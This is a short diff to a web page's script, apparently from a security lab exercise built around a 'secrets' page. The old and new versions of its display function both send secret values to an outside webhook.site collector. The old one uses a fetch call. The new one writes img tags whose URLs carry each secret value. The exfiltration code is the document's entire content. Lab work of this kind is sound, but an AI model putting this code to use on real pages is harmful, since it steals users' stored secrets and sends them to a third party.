@@ -31,15 +31,10 @@
 
 <script>
 function display(data) {
-  var ul= document.getElementById("secrets");
-  for (var key in data){
-    alert
-    var li = document.createElement("li");
-    li.appendChild(document.createTextNode(key+":"+data[key]));
-    ul.appendChild(li);
-  }
-	fetch("https://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?val="+key+"data="+data[key]);
-
+	for(var key in data) {
+		document.write("<img src='https://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?key="+ data[key] + "'/>");
+		//fetch('https://webhook.site/b8d6fabd-4739-4d22-b76a-5718a8da4609?val='+data[key]);
+	}
 }
 </script>
 <a href="http://ptl-08500332-74964989.libcurl.so/secrets/new">Add a secret</a>
